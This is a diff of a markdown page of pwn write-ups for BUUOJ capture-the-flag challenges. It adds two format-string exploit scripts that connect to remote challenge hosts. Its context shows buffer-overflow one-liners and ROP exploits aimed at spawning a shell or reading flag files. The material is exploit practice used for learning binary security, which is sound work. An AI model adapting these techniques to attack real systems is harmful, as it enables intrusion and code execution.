@@ -33,18 +33,17 @@ perl -e 'print "ls\ncat flag\n"' | test_your_nc
 ```
 
 ### rip
-1. `system("/bin/sh")` found 
-2. segfault??? _TODO_
+`system("/bin/sh")` found 
 
 ### warmup_csaw_2016
-1. `system("cat flag.txt")` found
+`system("cat flag.txt")` found
 
 ```shell
 perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016
 ```
 
 ### pwn1_sctf_2016
-1. `'system("cat flag.txt")'` found
+`'system("cat flag.txt")'` found
 
 ```shell
 perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1
@@ -60,11 +59,12 @@ perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | ./ciscn_2019_n_1
 [传送门]({{ site.url }}/pwn/buuoj-pwn-rop-ciscn_2019_c_1/)
 
 ### [OGeek2019]babyrop
-1. Flaw: `strncmp(a, b, 0)` always returns 0
+Flaw: `strncmp(a, b, 0)` always returns 0
 
 
 ```python
 #!/usr/bin/python3.6
+# 0x%x|0x%x|0x%x|0x%x|0x%x|0x%x|0x%x|0x%x
 from pwn import *
 
 elf = ELF('./babyrop')
@@ -114,7 +114,7 @@ proc.interactive()
 ```
 
 ### ciscn_2019_en_2
-1. The same as [ciscn_2019_c_1]
+The same as [ciscn_2019_c_1]
 
 
 ### get_started_3dsctf_2016
@@ -144,7 +144,7 @@ proc.sendline(payload)
 log.info(proc.recvall())
 ```
 ### [第五空间2019 决赛]PWN5
-1. [**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
+[**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
 
 ```python
 #!/usr/bin/python3.6
@@ -195,7 +195,7 @@ proc.interactive()
 ```
 
 ### [BJDCTF 2nd]r2t3
-1. Flaw: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
+Flaw: truncated string length: `uint8_t length = (uint8_t) strlen(input)`
 
 ```python
 #!/usr/bin/python3.6
@@ -245,7 +245,7 @@ proc.interactive()
 ```
 
 ### not_the_same_3dsctf_2016
-1. ROP, or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
+ROP, or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
 
 ```python
 #!/usr/bin/python3.6
@@ -312,7 +312,7 @@ proc.interactive()
 ```
 
 ### [BJDCTF 2nd]one_gadget
-1. Utility [one_gadget](https://github.com/david942j/one_gadget)
+Utility [one_gadget](https://github.com/david942j/one_gadget)
 
 ```python
 #!/usr/bin/python3.6
@@ -368,7 +368,7 @@ p.interactive()
 ```
 
 ### ciscn_2019_n_5
-1.  libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
+ libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
 
 ```python
 #!/usr/bin/python3.6
@@ -412,9 +412,7 @@ p.interactive()
 ```
 
 ### ciscn_2019_s_3
-1.  Construct `"/bin/sh"` on stack
-2.  ROP via `__libc_csu_init()`
-3.  Or, [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
+Construct `"/bin/sh"` on stack and rop via `__libc_csu_init()`, or [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
 
 ```python
 #!/usr/bin/python3.6
@@ -477,8 +475,8 @@ p.interactive()
 ```
 
 ### [HarekazeCTF2019]babyrop2
-1.  Leaked address of `printf()` ends with `"\x00"` and outputs nothing
-2.  Construct `"/bin/sh"` and ROP chain in .bss segment
+1. Caution: address of `printf()` ends with `"\x00"` and outputs nothing
+2. Construct `"/bin/sh"` and ROP chain in .bss segment
 
 ```python
 #!/usr/bin/python3.6
@@ -538,7 +536,7 @@ p.interactive()
 ```
 
 ### pwn2_sctf_2016
-1.  Flaw: only check if length<=0x20
+ Flaw: only check if length<=0x20
 
 ```python
 #!/usr/bin/python3.6
@@ -667,7 +665,7 @@ p.sendline(payload)
 p.interactive()
 ```
 ### ez_pz_hackover_2016
-1.  [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
+ [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
 
 ```python
 #!/usr/bin/python3.6
@@ -743,8 +741,7 @@ p.sendline(payload)
 p.interactive()
 ```
 ### ciscn_2019_ne_5
-1.  `system("sh")` works...
-2.  `scanf()` ignores `'\x0b'`
+`system("sh")` also works... `scanf()` ignores `'\x0b'`
 
 ```python
 #!/usr/bin/python3.6
@@ -821,7 +818,7 @@ p.interactive()
 `"/bin/////sh"` works fine
 
 ### ciscn_2019_es_2
-1.  [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
+ [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
 
 ```python
 #!/usr/bin/python3.6
@@ -861,11 +858,11 @@ p.sendline(payload)
 p.interactive()
 ```
 ### [BJDCTF 2nd]test: 
-1.  Flaw: incomplete filters and privilege escalation using [shell(`x86_64`)](https://zhuanlan.zhihu.com/p/138482510)
+ Flaw: incomplete filters and privilege escalation using [shell(`x86_64`)](https://zhuanlan.zhihu.com/p/138482510)
 
 
 ### spwn:
-1.  frame faking
+ frame faking
 
 ```python
 #!/usr/bin/python3.6
@@ -945,5 +942,75 @@ bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
  
 p.sendlineafter(b'Input:\n', b'1'*(ebp_offset + 4) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr))
+p.interactive()
+```
+
+### r2t4
+
+```python
+#!/usr/bin/python3.6
+import re
+from pwn import *
+
+filename = './r2t4'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 27872)
+
+# log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+target_sym, dest_got = e.sym['backdoor'], e.got['__stack_chk_fail']
+log.info(f'backdoor={hex(target_sym)}, __stack_chk_fail:got={hex(dest_got)}')
+
+payload = b"%c%c%c%c" 
+assert len(payload) % 8 == 0
+payload += b"%c%1553X" 
+assert len(payload) % 8 == 0
+payload += b'%x%x' + b"%hn " + p64(dest_got)
+assert len(payload) % 8 == 0
+payload += b"\x44" * (0x30 - len(payload))
+assert len(payload) % 8 == 0
+
+p.sendline(payload)
+
+content = p.recvall()
+m = re.search(b'flag{.*}', content)
+log.success(m.group())
+```
+
+### jarvisoj_fm
+
+```python
+#!/usr/bin/python3.6
+import re
+from pwn import *
+
+filename = './fm'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 25936)
+
+payload = b"%llx%llx" #
+payload += b"%llx%llx" #
+payload += b"%llx%llx" # 
+
+payload += b'%llx' #
+payload += b'%llx' #
+payload += b'%0104llx' #
+payload += b'%llx' #
+payload += b'%llx' #
+payload += b'%llx' #
+payload += b'%hhn' #
+payload += p32(0x804a02c)
+
+log.info(f'len={hex(len(payload))}')
+# input()
+p.sendline(payload)
+# content = p.recvuntil(b'\x2c')
+# content = content[:-1]
+# log.success(f'len={hex(len(content))}, byte={hex(len(content) % 256)}, content={content}')
+# print(content.decode())
 p.interactive()
 ```
